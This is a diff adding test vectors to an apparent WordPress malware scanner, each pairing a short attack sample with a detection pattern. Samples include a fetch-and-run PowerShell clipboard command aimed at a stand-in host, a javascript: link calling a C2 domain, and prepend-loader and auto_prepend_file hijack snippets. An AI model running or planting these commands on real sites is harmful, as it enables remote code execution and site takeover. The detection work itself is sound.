@@ -117,6 +117,54 @@ const testVectors = [
       const localHash = crypto.createHash('md5').update(localContent).digest('hex');
       return localHash !== officialCleanHash;
     }
+  },
+  {
+    id: 'sc_mesh_loader',
+    category: 'Malla SC Malware / Prepend (Sucuri 2026)',
+    sample: "<?php\ndefine('SC_AUTO_PREPEND', 1);\n/* SC_START */\n$payload = base64_decode('...');\n/* SC_END */",
+    regex: /(SC_AUTO_PREPEND|SC_START|SC_END|SC_BLOCK|\$GLOBALS\s*\[\s*['"]SC_[A-Z0-9_]+['"]\s*\]|\/\*\s*SC_[A-Z0-9_]+\s*\*\/)/i
+  },
+  {
+    id: 'blockchain_c2_eth_rpc',
+    category: 'Comando y Control Web3 RPC (Sucuri 2026)',
+    sample: "$endpoint = 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161';\n$res = wp_remote_post($endpoint, ['body' => json_encode(['method' => 'eth_call'])]);",
+    regex: /(mainnet\.infura\.io|rpc\.ankr\.com|alchemy\.com\/v2|cloudflare-eth\.com|eth\.llamarpc\.com|eth-mainnet\.g\.alchemy\.com|web3_clientVersion)/i
+  },
+  {
+    id: 'shared_memory_persistence',
+    category: 'Persistencia Shared Memory IPC (Sucuri 2026)',
+    sample: "$shm_id = shmop_open(0x1337, 'c', 0644, 4096);\nshmop_write($shm_id, $code, 0);",
+    regex: /(shmop_open|shmop_read|shmop_write|shmat|shmdt|shm_get_var|shm_put_var|ftok\s*\()/i
+  },
+  {
+    id: 'auto_prepend_hijack',
+    category: 'Secuestro auto_prepend_file (Sucuri 2026)',
+    sample: "; .user.ini configuration\nauto_prepend_file = \"wp-content/c1b12371.php\"",
+    regex: /(auto_prepend_file|auto_append_file)\s*=\s*['"]?([^\s'"]+\.php)/i
+  },
+  {
+    id: 'clickfix_smuggling',
+    category: 'ClickFix Smuggling / PowerShell (CTM360 2026)',
+    sample: "copyToClipboard('curl -s https://gate.cloud/drop.ps1 | powershell');",
+    regex: /(powershell\s+(-e|-enc|-encodedcommand|-w\s+hidden)|mshta\s+https?:\/\/|certutil\s+-urlcache|curl\s+-[sS]?[kK]?\s+https?:\/\/[^\s|]+\s*\|\s*powershell|Invoke-Expression\s*\(|IEX\s*\(New-Object)/i
+  },
+  {
+    id: 'comment2shell_xss',
+    category: 'Comment2Shell Salto de Línea (CVE-2026-93485)',
+    sample: '<a href=\n"javascript:fetch(\'https://c2.net\')">Click to read comment</a>',
+    regex: /(<[a-z0-9_-]+(\s+[a-z0-9_-]+(\s*=\s*(['"][^'"]*[\r\n]+[^'"]*['"]|[^\s>]+))?)*\s*(href|src|action)\s*=\s*['"]?\s*javascript:|<[a-z]+[^>]*[\r\n]+[^>]*javascript:)/is
+  },
+  {
+    id: 'arbitrary_file_upload_rce',
+    category: 'Subida Arbitraria AJAX (CVE-2026-27540)',
+    sample: "add_action('wp_ajax_nopriv_wwlc_file_upload_handler', 'wwlc_file_upload_handler');",
+    regex: /(wwlc_file_upload_handler|unauthenticated.*upload|allow_unauthenticated_upload)/i
+  },
+  {
+    id: 'uploads_htaccess_unprotected',
+    category: 'Uploads sin Bloqueo PHP (Hardening #3)',
+    sample: "# uploads dir sin regla de contencion\n",
+    testFn: (content) => content.toLowerCase().indexOf('deny from all') === -1
   }
 ];
 
